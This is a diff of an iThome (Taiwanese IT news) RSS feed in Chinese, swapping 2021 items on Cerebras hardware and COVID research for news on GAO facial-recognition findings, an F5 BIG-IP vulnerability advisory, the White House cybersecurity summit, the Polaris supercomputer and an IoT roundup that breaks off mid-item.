- <description>&lt;div class=&quot;field field-name-field-news-column-category field-type-taxonomy-term-reference field-label-hidden&quot;&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;a href=&quot;/tags/%E6%96%B0%E8%81%9E&quot;&gt;新聞&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-body field-type-text-with-summary field-label-hidden&quot;&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt; &lt;p&gt;在2016年成立，專注於建置AI與深度學習電腦系統的Cerebras Systems，於24日發表了&lt;a href=&quot;https://cerebras.net/blog/announcing-the-cerebras-architecture-for-extreme-scale-ai/&quot; target=&quot;_blank&quot;&gt;號稱是全球第一個大腦等級的AI解決方案&lt;/a&gt;，藉由一個冰箱大小的CS-2系統，來支援超過120兆個參數的模型，勝過了人腦中所存在的100兆個突觸。&lt;/p&gt;
-&lt;p&gt;Cerebras指出，人腦約含有100兆個突觸，而過去最大的AI硬體叢集大概只占人腦的1%，相當於1兆個突觸，而在AI系統上則稱為參數，由於它僅等於人腦的一小部分，這些由繪圖處理器組成的叢集除了要占用數英畝的空間與數兆瓦的功率之外，也必須由專門的團隊來操作。&lt;/p&gt;
-&lt;p&gt;Cerebras所建置的CS-2系統採用了4項創新技術，於小空間創造了與人腦相當的AI能力，這些技術分別是軟體執行架構Cerebras Weight Streaming、記憶體擴張技術Cerebras MemoryX、高效能互連構造Cerebras SwarmX，以及動態的稀疏收集技術Selectable Sparsity。&lt;/p&gt;
-&lt;p&gt;其中，Weight Streaming可將模型參數存放在晶片外，卻可提供像是位於晶片的同樣訓練及推理效能。此一新的執行模型拆解了運算與參數的儲存，讓研究人員能夠彈性地擴展規模與速度，也消除了大叢集可能導致的延遲及記憶體寬頻的問題，還讓使用者能夠在不需變更軟體的狀況下，使用1到192個CS-2。&lt;/p&gt;
-&lt;p&gt;MemoryX則是讓CS-2可支援具備120兆個參數模型的基礎，SwarmX允許Cerebras可連結192個CS-2中的1.63億個AI最佳化核心，藉以訓練單一神經網路，Selectable Sparsity則是用來權衡模型中的稀疏程度，以減少所需的浮點運算效能及解決時間。&lt;/p&gt;
-&lt;p&gt;Cerebras指出，結合上述技術將能輕鬆地解鎖大腦等級的神經網路，並將任務分派到基於AI最佳化核心所組成的叢集上。&lt;/p&gt;
-&lt;p&gt;美國阿貢國家實驗室（Argonne National Laboratory）副主任Rick Stevens表示，前幾年的研究顯示，對於自然語言處理（NLP）模型來說，洞察力與參數成正比，參數愈多，結果便愈好，Cerebras的創新讓參數增加了100倍，將有改變整個產業的潛力。&lt;/p&gt;
-&lt;p&gt;吸引外界注意的還有CS-2系統所採用的WSE-2晶片，它是一個 46,225平方公釐的矽晶片，只比9.7吋的iPad還要大一些，內建2.6兆個電晶體，85萬個AI最佳化核心，40Gb記憶體，20 PB/s記憶體頻寬，以及220 Pb/s的互連頻寬，採用台積電的7奈米製程技術，它是全球最大的電腦晶片，也是地球上最獨特的半導體裝置之一。&lt;/p&gt;
-&lt;p class=&quot;rtecenter&quot;&gt;&lt;img alt=&quot;&quot; src=&quot;https://s4.itho.me/sites/default/files/images/0825-Cerebras%20WSE-2.png&quot; style=&quot;width: 600px;&quot; /&gt;&lt;/p&gt;
-&lt;p&gt;&lt;span style=&quot;color:#696969;&quot;&gt;圖片來源_Cerebras&lt;/span&gt;&lt;/p&gt;
- &lt;/div&gt;&lt;/div&gt;&lt;/div&gt;</description>
- <pubDate>Wed, 25 Aug 2021 08:30:50 +0000</pubDate>
+ <pubDate>Thu, 26 Aug 2021 07:52:06 +0000</pubDate>
  <dc:creator>陳曉莉</dc:creator>
- <guid isPermaLink="false">146379 at https://www.ithome.com.tw</guid>
- <comments>https://www.ithome.com.tw/news/146379#comments</comments>
+ <guid isPermaLink="false">146400 at https://www.ithome.com.tw</guid>
+ <comments>https://www.ithome.com.tw/news/146400#comments</comments>
 </item>
 <item>
- <title>科技部集結5校展示智慧防疫研究成果，更盼藉此催生出新的精準健康產業</title>
- <link>https://www.ithome.com.tw/news/146377</link>
- <description>&lt;div class=&quot;field field-name-field-news-column-category field-type-taxonomy-term-reference field-label-hidden&quot;&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;a href=&quot;/tags/%E6%96%B0%E8%81%9E&quot;&gt;新聞&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-body field-type-text-with-summary field-label-hidden&quot;&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt; &lt;p&gt;由科技部去年中投入成立的防疫科學研究中心，集結臺灣大學、陽明交通大學、成功大學、長庚大學及國防醫學院共5間學校，共同投入COVID-19抗疫和防疫科學研究，並在今日（8/25）公開展示一年來研究中心的成果，其中更有不少防疫研究或應用成果，迄今已有醫院或集中檢疫所拿來採用。&lt;/p&gt;
-&lt;p&gt;科技部部長吳政忠表示，這次防疫中心的成果展示，不只運用原本學理檢測技術，更把AI、5G、物聯網科技帶進來，運用到防疫所需要的監測、預防、檢驗、醫療，以及零接觸照護，來幫助臺灣防疫做得更好，甚至也有機會在臺灣催生出新的精準健康產業。&lt;/p&gt;
-&lt;p&gt;整體來看，5間大學研究團隊所展示的防疫研究或應用成果，不少都運用上現在當紅AI、大數據、雲端與物聯網相關技術，來發展出各種智慧防疫應用。&lt;/p&gt;
-&lt;p&gt;&lt;img alt=&quot;&quot; src=&quot;https://s4.itho.me/sites/default/files/images/PXL_20210825_024012746.jpg&quot; style=&quot;width: 600px; height: 338px;&quot; /&gt;&lt;/p&gt;
-&lt;p&gt;像是本土疫情爆發期間，大量檢疫者或確診者集中入住檢疫站，防疫人員不只得時時確認所有人都待在自己的房內，他們身體健康的監測也很重要，必須隨時注意，所以，成功大學團隊想出新作法，將防疫與物聯網結合，打造生理監測防疫平臺，搭配智慧手環，來持續監測住民健康狀況，包括體溫、心跳、血氧變化等，而且更即時，新化集中檢疫站就有採用這套平臺，一旦偵測有異常，如血氧過低時，系統就會立即告警，護理人員收到通知，能夠馬上反應，將人後送到醫學中心救治。&lt;/p&gt;
-&lt;p&gt;不光如此，他們後來還打造一站式智慧採檢實驗屋，來強化醫病分流，而且不只提供採檢，在這個實驗屋內還運用AI技術，來提高採檢作業效率，像是以X光檢驗，結合AI影像判讀系統，來幫助醫師快速判讀，一旦發現採檢者的X光片有問題，如顯示肺炎病灶，就能馬上將受檢者進行隔離。這種檢測方式比起PCR檢測更快，不用4到6小時。另外這個實驗屋還可以四處移動。成大醫院兩個月前在自家急診室戶外開始用。&lt;/p&gt;
-&lt;p&gt;陽明交通大學結合AI防疫應用也不少，並且實際落地，像是新北聯醫6月開始使用一套COVID-19血氧監測雲端平臺，能即時監看患者的血氧資訊變化，正是由陽明交通大學團隊與中華電信共同打造，結合AIoT與雲端技術，有別於傳統血氧監測，可以達到更即時監測，幫助醫院找出有隱形缺氧的患者，同時減少第一線醫護人員接觸風險。&lt;/p&gt;
-&lt;p&gt;運用AI找到新冠解方，也是該團隊早期另一項研究成果，他們利用AI與大數據分析技術，模擬宿主受病毒感染後的體內細胞變化機制，來與數百種冠狀病毒的蛋白酶3D圖像比對，從中找出可以有效抑制新冠病毒活性的老藥解方，這項成果，後來也在國際頂尖期刊發表，目前進到動物實驗階段。&lt;/p&gt;
-&lt;p&gt;低血氧雲端監測平臺，臺灣大學團隊自己也有研發一套，這套平臺今年7月已提供給部立桃園醫院做使用，用來監測患者生理資訊，目前在該院內集中檢疫所與負壓隔離病房都有用。不僅如此，他們更結合了HoloLens混合實境設備，讓看診醫師不需要進到病房，也能透過護理人員的視角看到現場畫面，即時對患者進行醫療診斷。&lt;/p&gt;
-&lt;p&gt;另外，臺灣大學新創團隊iTech則是開發了各種科技防疫產品，來協助政府防堵疫情擴散，像是有結合AI追蹤及定位的感測器，能用來偵測民眾彼此有無保持安全社交距離。另外還開發防疫無人載具，能協助防疫人員迅速完成公共場所的清消作業，降低人員染疫的風險。&lt;/p&gt;
+ <title>美國政府審計辦公室調查：聯邦機構的人臉辨識應用以數位存取及網路安全為大宗</title>
+ <link>https://www.ithome.com.tw/news/146398</link>
+ <description>&lt;div class=&quot;field field-name-field-news-column-category field-type-taxonomy-term-reference field-label-hidden&quot;&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;a href=&quot;/tags/%E6%96%B0%E8%81%9E&quot;&gt;新聞&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-body field-type-text-with-summary field-label-hidden&quot;&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt; &lt;p&gt;&lt;a href=&quot;https://www.gao.gov/assets/gao-21-526.pdf&quot; target=&quot;_blank&quot;&gt;美國政府審計辦公室（GAO）本周再度公布&lt;/a&gt;美國聯邦機構使用人臉辨識技術（Facial Recognition Technology，FRT）的調查報告，指出在接受調查的24個機構中，有18個正在使用FRT系統，其目的各自不同，但有高達16個機構是應用在數位存取及網路安全上，算是最普及的應用。&lt;/p&gt;
+&lt;p&gt;有些機構的FRT只有單一功能，但大多數擁有多重目的。調查顯示，有16個機構是以人臉辨識技術來執行數位存取及網路安全任務，例如要解鎖官方提供的手機或筆電時，或是要存取政府網站時，作為身分識別之用。&lt;/p&gt;
+&lt;p&gt;亦有6個機構利用人臉辨識系統來進行犯罪調查，有時是辨識嫌犯，有時是辨識受害者，而它們使用的可能是商業人臉辨識系統，例如國土安全部（DHS）、司法部（DOJ）、美國衛生及公共服務部（HHS）及美國內政部（DOI）使用了&lt;a href=&quot;https://www.ithome.com.tw/news/135443&quot; target=&quot;_blank&quot;&gt;Clearview AI&lt;/a&gt;。&lt;/p&gt;
+&lt;p&gt;有5個機構以FRT系統來保障實體安全，包括監控特定人士是否進入了某處，或者是控制某個場所或建築的入口，例如有一個機構以FRT來監控即時影片中是否出現了某些警告名單中的人物，並在發現時通知警衛，包括商務部、國防部、能源部、司法部與美國衛生及公共服務部。&lt;/p&gt;
+&lt;p&gt;美國國土安全部及美國國務院也利用FRT系統來辨識非法入境美國的旅客；有4個機構以FRT來維護國家與國防安全，如偵測恐怖份子。&lt;/p&gt;
+&lt;p&gt;此外，總計有10個機構藉由FRT系統來進行研究，例如有多個機構借助FRT的能力，於疫情期間偵測人們戴口罩的比例，或是用來偵測圖像處理；還有3個機構利用FRT來確認取得臨時通行證的訪客身分，像是國防部、司法部與NASA。&lt;/p&gt;
+&lt;p&gt;值得一提的是，有些機構擁有不只一個FRT系統，例如國防部及司法部各自擁有7個FRT系統，國土安全部則擁有4個FRT系統，而且它們還經常會互通有無。此外，有10個機構打算在2023年以前擴大FRT系統的應用，像是擴大在機場的部署。&lt;/p&gt;
  &lt;/div&gt;&lt;/div&gt;&lt;/div&gt;</description>
- <pubDate>Wed, 25 Aug 2021 07:51:10 +0000</pubDate>
+ <pubDate>Thu, 26 Aug 2021 06:46:55 +0000</pubDate>
+ <dc:creator>陳曉莉</dc:creator>
+ <guid isPermaLink="false">146398 at https://www.ithome.com.tw</guid>
+ <comments>https://www.ithome.com.tw/news/146398#comments</comments>
+</item>
+<item>
+ <title>F5修補Big-IP重大漏洞</title>
+ <link>https://www.ithome.com.tw/news/146397</link>
+ <description>&lt;div class=&quot;field field-name-field-news-column-category field-type-taxonomy-term-reference field-label-hidden&quot;&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;a href=&quot;/tags/%E6%96%B0%E8%81%9E&quot;&gt;新聞&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-body field-type-text-with-summary field-label-hidden&quot;&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt; &lt;p&gt;&lt;a href=&quot;https://support.f5.com/csp/article/K50974556&quot; target=&quot;_blank&quot;&gt;F5本周發布安全公告&lt;/a&gt;，包含13個高風險及1個允許攻擊者執行指令或刪改檔案的重大安全漏洞。&lt;/p&gt;
+&lt;p&gt;此次F5修補的30個漏洞中包括13個高風險漏洞，其中&lt;a href=&quot;https://support.f5.com/csp/article/K41351250&quot; target=&quot;_blank&quot;&gt;CVE-2021-23031&lt;/a&gt;屬於權限升級漏洞。它位於流量管理員UI（TMUI）的組態工具中，一旦遭到開採，具有存取權限的攻擊者就可於系統上執行任意系統指令、新增、刪改檔案，或是關閉服務，甚至可讓攻擊者接管整臺系統。&lt;/p&gt;
+&lt;p&gt;這個漏洞影響BIG-IP Advanced WAF（Web Application Firewall）11.x-16.x版，和 BIG-IP ASM（Application Security Manager），CVSS 3.0 風險值8.8，但在純裝置模式（Appliance Mode Only）下風險值高達9.9。&lt;/p&gt;
+&lt;p&gt;由於這漏洞允許合法使用者發動攻擊，故沒有有效的緩解方法，F5建議用戶儘速升級到最新版本以確保安全。&lt;/p&gt;
+&lt;p&gt;其他高風險漏洞風險值分佈於7.2和7.5之間。其中Big IP Advanced WAF 與ASM還分別存在其他4項漏洞（CVE-2021-23028、CVE-2021-23029、CVE-2021-23030、CVE-2021-23032、CVE-2021-23033），導致程式終結及伺服器請求偽造（Server-Side Request Forgery）攻擊。其他漏洞還有跨站腳本程式碼（XXS）、遠端程式碼執行（RCE）攻擊及程式中止，影響產品包括BIG-IP DNS、BIG-IP TMM、BIG-IP TMUI、iControl等。&lt;/p&gt;
+ &lt;/div&gt;&lt;/div&gt;&lt;/div&gt;</description>
+ <pubDate>Thu, 26 Aug 2021 06:21:38 +0000</pubDate>
+ <dc:creator>林妍溱</dc:creator>
+ <guid isPermaLink="false">146397 at https://www.ithome.com.tw</guid>
+ <comments>https://www.ithome.com.tw/news/146397#comments</comments>
+</item>
+<item>
+ <title>白宮舉行資安高峰會：微軟、Google、蘋果、Amazon及IBM等業者共襄盛舉，承諾將大幅改善資安</title>
+ <link>https://www.ithome.com.tw/news/146396</link>
+ <description>&lt;div class=&quot;field field-name-field-news-column-category field-type-taxonomy-term-reference field-label-hidden&quot;&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;a href=&quot;/tags/%E6%96%B0%E8%81%9E&quot;&gt;新聞&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-body field-type-text-with-summary field-label-hidden&quot;&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt; &lt;p&gt;&lt;a href=&quot;https://www.whitehouse.gov/briefing-room/statements-releases/2021/08/25/fact-sheet-biden-administration-and-private-sector-leaders-announce-ambitious-initiatives-to-bolster-the-nations-cybersecurity/&quot; target=&quot;_blank&quot;&gt;美國總統拜登（Joe Biden）在本周三（8/25）會見了私人企業與教育界的領袖&lt;/a&gt;，共同商討如何透過全國的努力來解決美國的資安威脅，除了由政府發起的多個倡議之外，微軟、Google、蘋果、Amazon及IBM等業者也都作出了承諾，其中，Google及微軟將在未來5年分別投入100億及200億美元的資金，來推動供應鏈、開源碼與架構的安全性。&lt;/p&gt;
+&lt;p&gt;這場資安高峰會擘畫了各方所扮演的角色，從美國政府、私人企業到教育機構。&lt;/p&gt;
+&lt;p&gt;&lt;span style=&quot;font-size:28px;&quot;&gt;&lt;strong&gt;政策先行&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;去年12月美國網管平臺業者&lt;a href=&quot;https://www.ithome.com.tw/article/141943&quot; target=&quot;_blank&quot;&gt;SolarWinds遭到多個駭客組織入侵&lt;/a&gt;，微軟&lt;a href=&quot;https://www.ithome.com.tw/news/143001&quot; target=&quot;_blank&quot;&gt;Exchange Server於今年3月爆發零時差攻擊行動&lt;/a&gt;，美國最大燃油管道系統Colonial Pipeline在今年5月7日遭到勒索軟體攻擊，&lt;a href=&quot;https://www.ithome.com.tw/news/144276&quot; target=&quot;_blank&quot;&gt;造成美國東岸45%的燃料供應中斷&lt;/a&gt;，持續發生的資安事件讓&lt;a href=&quot;https://www.whitehouse.gov/briefing-room/statements-releases/2021/05/12/fact-sheet-president-signs-executive-order-charting-new-course-to-improve-the-nations-cybersecurity-and-protect-federal-government-networks/&quot; target=&quot;_blank&quot;&gt;拜登於5月12日簽署一行政命令&lt;/a&gt;，要求改善美國的網路安全並保護聯邦政府的網路。&lt;/p&gt;
+&lt;p&gt;該行政命令的主要目的包括：促進政府與私人機構之間的威脅情報分享，於&lt;a href=&quot;https://www.ithome.com.tw/news/145709&quot;&gt;聯邦政府中實施更現代化也更強大的網路安全標準（包含零信任架構）&lt;/a&gt;，改善軟體供應鏈的安全性，建立網路安全審查委員會，建立回應網路意外的標準手冊，改善聯邦政府網路偵測網路安全意外的能力，以及增進調查與修復能力。&lt;/p&gt;
+&lt;p&gt;而在本周舉行的資安高峰會上，拜登再度宣布美國國家標準與技術研究所（NIST）將與產業合作，共同開發一個新框架來提高技術供應鏈的安全與完整性，且微軟、Google、IBM、Travelers及Coalition都將加入此一倡議。&lt;/p&gt;
+&lt;p&gt;拜登也宣布將把工業控制系統網路安全倡議所專注的領域，從原先的電力公用事業，擴大到天然氣管道。&lt;/p&gt;
+&lt;p&gt;&lt;span style=&quot;font-size:28px;&quot;&gt;&lt;strong&gt;私人企業共襄盛舉&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;美國的大型企業亦紛紛承諾要加入白宮的號召。其中，蘋果計畫建立一個新專案來改善該公司技術供應鏈的安全性，將與其供應鏈合作，大規模地採行雙因素認證、安全訓練、漏洞修復、事件紀錄及意外回應等，包括在美國的逾9,000家蘋果供應鏈。&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://blog.google/technology/safety-security/why-were-committing-10-billion-to-advance-cybersecurity/&quot; target=&quot;_blank&quot;&gt;Google則宣布將在未來5年投入100億美元的資金&lt;/a&gt;，擴張其各式的零信任專案，協助強化軟體供應鏈及開源碼的安全性，以及協助10萬名美國人取得經產業認可的數位技能證書，讓他們可申請高薪與高成長的工作。&lt;/p&gt;
+&lt;p class=&quot;rtecenter&quot;&gt;&lt;img alt=&quot;&quot; src=&quot;https://s4.itho.me/sites/default/files/images/0826-Nation%20Cybersecurity%20%E8%B0%B7%E6%AD%8C.png&quot; style=&quot;width: 500px;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;IBM也將加入資安人才培養，準備在未來3年訓練出15萬名具備資安能力的人才，並與逾20所黑人學院/大學合作，建立網路安全領導中心，培育更多樣化的網路人才。&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://twitter.com/satyanadella/status/1430646543376289793&quot; target=&quot;_blank&quot;&gt;微軟也將在未來5年大手筆地投入200億美元&lt;/a&gt;，以於產品及服務中整合網路安全，並提供先進的安全解決方案，同時立即提供1.5億美元的技術服務，來協助美國聯邦、州與地方政府升級安全保護能力，也將擴大與各大專院校在培育資安人才上的合作案。&lt;/p&gt;
+&lt;p class=&quot;rtecenter&quot;&gt;&lt;img alt=&quot;&quot; src=&quot;https://s4.itho.me/sites/default/files/images/0826-Nation%20Cybersecurity%20%E5%BE%AE%E8%BB%9F.png&quot; style=&quot;width: 500px;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Amazon將免費釋出內部的安全意識訓練服務，且未來每個AWS帳號都可免費取得多因素認證裝置來預防網釣或密碼竊盜威脅，以保障AWS用戶的帳號安全。&lt;/p&gt;
+&lt;p&gt;網路保險服務供應商Resilience與Coalition也加入了本周的高峰會，Resilience宣布將制定新政策，只有符合網路安全最佳實踐的客戶才能投保，Coalition則說要免費釋出其網路安全風險評估暨持續監控平臺。&lt;/p&gt;
+&lt;p&gt;&lt;span style=&quot;font-size:28px;&quot;&gt;&lt;strong&gt;透過資安教育培養更多的人才&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;根據白宮的估計，涵蓋私人企業或政府機構，目前全美大概還缺少接近50萬名的資安人才，而這也是為什麼各大企業除了改善自家安全能力之外，也承諾要幫忙進行教育訓練。&lt;/p&gt;
+&lt;p&gt;而程式設計培訓平臺Code.org承諾會在未來3年內，向300萬名學生教授網路安全概念。專門培養女性程式設計師的Girls Who Code則準備建立一個微型培訓計畫，協助那些少數族群取得獎學金與早期的職業機會。德國大學系統將擴大既有的網路相關證書，同時推出短期的網路證書，來加強美國的網路安全工作者。甫成為美國國家科學基金會（NSF）先進技術教育國家網路安全中心的華盛頓州社區大學，未來將提供網路安全教育，進行教師的培訓，以及追蹤學生從唸書到就業的過程。&lt;/p&gt;
+ &lt;/div&gt;&lt;/div&gt;&lt;/div&gt;</description>
+ <pubDate>Thu, 26 Aug 2021 05:36:00 +0000</pubDate>
+ <dc:creator>陳曉莉</dc:creator>
+ <guid isPermaLink="false">146396 at https://www.ithome.com.tw</guid>
+ <comments>https://www.ithome.com.tw/news/146396#comments</comments>
+</item>
+<item>
+ <title>美能源部將部署Exascale等級GPU超級電腦Polaris</title>
+ <link>https://www.ithome.com.tw/news/146394</link>
+ <description>&lt;div class=&quot;field field-name-field-news-column-category field-type-taxonomy-term-reference field-label-hidden&quot;&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;a href=&quot;/tags/%E6%96%B0%E8%81%9E&quot;&gt;新聞&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-body field-type-text-with-summary field-label-hidden&quot;&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt; &lt;p&gt;美國能源部下的阿貢國家實驗室&lt;a href=&quot;https://nvidianews.nvidia.com/news/nvidia-turbocharges-extreme-scale-ai-for-argonne-national-laboratorys-polaris-supercomputer&quot; target=&quot;_blank&quot;&gt;（Argonne National Laboratory）昨（25）日宣布&lt;/a&gt;，將使用結合HPE、AMD、Nvidia技術打造超過2千顆 GPU的Exascale等級超級電腦，名為Polaris，以支援美國能源部的進階工程及科學研究。&lt;/p&gt;
+&lt;p&gt;Polaris超級電腦將代管在阿貢國家實驗室的領導運算設施（ALCF），它是由280部HPE Apollo Gen10 Plus系統組成，並搭載560顆AMD 2、3代EPYC處理器、2,240顆Nvidia A100 Tensor Core GPU，以及HPE Slingshot乙太網路光纖交換器及管理軟體。這座超級電腦可產生1.4 exaflops的理論AI運算效能，以及將近44 petaflops的雙精度（double-precision）浮點運算尖峰效能。而Polaris搭載的GPU數量之多，也使之成為ALCF最大的GPU-based電腦。&lt;/p&gt;
+&lt;p&gt;若根據6月公佈的&lt;a href=&quot;https://www.top500.org/lists/top500/2021/06/&quot; target=&quot;_blank&quot;&gt;500大超級電腦名單&lt;/a&gt;，Polaris的效能約相當於全球第9大超級電腦。&lt;/p&gt;
+&lt;p&gt;Polaris一開始將用於能源部Exascale運算專案（Exascale Computing Project），及ALCF一系列高效能運算（HPC）及人工智慧（AI）的工程和科學研究專案。Polaris將支援阿貢國家實驗室科學家進行腫瘤細胞及藥物、分子對撞尋求暗物質證據等，牽涉複雜與高速運算的研究，也會用於潔淨能源、生物質（biomass）轉為生質燃料等技術研發。此外，也會支援其他機構，包括同屬能源部的阿貢實驗室先進光子源（Advanced Photon Source）及奈米材料中心的研究。&lt;/p&gt;
+&lt;p&gt;而能源部Exascale運算專案也會利用Polaris測試軟體及應用程式測試及最佳化，以用於阿貢國家實驗室另一座Exascale等級超級電腦Aurora，後者將採用Intel CPU及HPE伺服器及網路技術。&lt;/p&gt;
+&lt;p&gt;Polaris將在今年8月開始安裝、部署，預計2022年初上線使用，而在明年春天開放給HPE研究計畫團隊使用。&lt;/p&gt;
+ &lt;/div&gt;&lt;/div&gt;&lt;/div&gt;</description>
+ <pubDate>Thu, 26 Aug 2021 04:14:02 +0000</pubDate>
+ <dc:creator>林妍溱</dc:creator>
+ <guid isPermaLink="false">146394 at https://www.ithome.com.tw</guid>
+ <comments>https://www.ithome.com.tw/news/146394#comments</comments>
+</item>
+<item>
+ <title>IoT雙周報第98期：Google翻新Nest家用保全產品，整合TPU邊緣運算晶片每秒可執行7.5次ML推論</title>
+ <link>https://www.ithome.com.tw/news/146391</link>
+ <description>&lt;div class=&quot;field field-name-field-news-column-category field-type-taxonomy-term-reference field-label-hidden&quot;&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;a href=&quot;/tags/%E6%96%B0%E8%81%9E&quot;&gt;新聞&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-body field-type-text-with-summary field-label-hidden&quot;&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt; &lt;h3&gt;&lt;span style=&quot;color: rgb(0, 0, 255);&quot;&gt;&lt;strong&gt;08/07~08/20精選IoT新聞&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
+&lt;p&gt;&lt;span style=&quot;color: rgb(255, 255, 255);&quot;&gt;&lt;strong&gt;&lt;span style=&quot;background-color: rgb(51, 153, 255);&quot;&gt;Google &lt;/span&gt;&lt;/strong&gt;&lt;/span&gt; &lt;span style=&quot;color: rgb(255, 255, 255);&quot;&gt;&lt;strong&gt;&lt;span style=&quot;background-color: rgb(51, 153, 255);&quot;&gt;  AIoT &lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style=&quot;font-size: 22px;&quot;&gt;&lt;strong&gt;Google Nest家用保全產品大翻新，全面導入AIoT邊緣運算功能&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&quot;&quot; src=&quot;https://s4.itho.me/sites/default/files/images/%40%E5%9C%961%EF%BC%9A%E5%9C%961_IoT%E9%9B%99%E5%91%A8%E5%A0%B1.jpg&quot; style=&quot;width: 600px; height: 337px;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;近日Google一連推出4款Nest家用保全系列產品，皆整合AIoT應用服務，可以直接在產品裝置上執行AI或機器學習模型。&lt;/p&gt;
+&lt;p&gt;這4款產品，包括一款室內用升級版Google Nest Cam監視器、整合室外燈的監視器Google Nest Cam with floodlight以及兩款電池供電的Google Nest Cam監視器與Google Nest Doorbell。&lt;/p&gt;
+&lt;p&gt;Google為這4款Nest家用保全產品，皆提供本地端AIoT執行功能，除了可以就近提供影像識別，在偵測到有人、動物、車輛或包裏靠近時傳送通知， 甚至也提供更進階人臉辨識功能。因為是在本地端執行ML推論模型，資料不一定要傳雲，所以即使沒有網路也能用，並且在離線狀態下可記錄長達一周的影像事件。&lt;/p&gt;
+&lt;p&gt;在裝置硬體部分也有所強化，不論是新的Nest監視器或門鈴皆內建Google TPU晶片，可以高度省電方式在裝置上跑ML模型，且每秒可執行多達7.5次推論。&lt;/p&gt;
+&lt;p&gt;電池版Nest Cam和Nest Doorbell已開放預訂，並在8月24日正式銷售，售價均為179.99美元。結合照明的Nest Cam監視器和新一代Nest Cam不久也將推出，價格各是279.99美元與99美元。&lt;/p&gt;
+&lt;p&gt;&lt;span style=&quot;color: rgb(255, 255, 255);&quot;&gt;&lt;strong&gt;&lt;span style=&quot;background-color: rgb(51, 153, 255);&quot;&gt; 穿戴式手錶  &lt;/span&gt;&lt;/strong&gt;&lt;/span&gt; &lt;span style=&quot;color: rgb(255, 255, 255);&quot;&gt;&lt;strong&gt;&lt;span style=&quot;background-color: rgb(51, 153, 255);&quot;&gt;  三星 &lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style=&quot;font-size: 22px;&quot;&gt;&lt;strong&gt;三星新智慧手錶Galaxy Watch4問世，不只翻新OS還原生整合Google應用服務&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&quot;&quot; src=&quot;https://s4.itho.me/sites/default/files/images/%40%E5%9C%962%EF%BC%9A%E5%9C%962_IoT%E9%9B%99%E5%91%A8%E5%A0%B1.jpg&quot; style=&quot;width: 600px;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;在日前一場新品發表會上，三星發布新一代智慧手錶Galaxy Watch4，除了更新各種健康運動功能外，最大改變就是採用與Google合作打造的統合Wear OS作為三星手錶新OS，取代三星原有Tizen OS。&lt;/p&gt;
+&lt;p&gt;與先前三星Galaxy Watch手錶相比，Galaxy Watch4所搭載的Wear OS原生整合Google應用服務，包含Google地圖、Messages、Google Pay付款，以及YouTube Music，還可從Google Play將第三方App下載到Galaxy Watch4，如adidas Running、Calm、Strava與Spotify等。&lt;/p&gt;
+&lt;p&gt;新版Wear OS還採用全新One UI Watch操作介面，不僅手錶介面與App外觀皆改用Google的Material You設計語言做開發，來提供用戶更好地的操作體驗，還因此提高與三星手機整合與同步。&lt;/p&gt;
+&lt;p&gt;對於與三星合作打造新Wear OS，Google穿戴產品管理總監Bjorn Kilburn 在自家部落格發表文章表示，借助新Wear OS，不僅讓Galaxy Watch4設定快2.5倍，而且續航力更長，達到40 小時，且App啟動時間更短，只有原來三分之一，還可支援Google眾多應用和服務生態系。&lt;/p&gt;
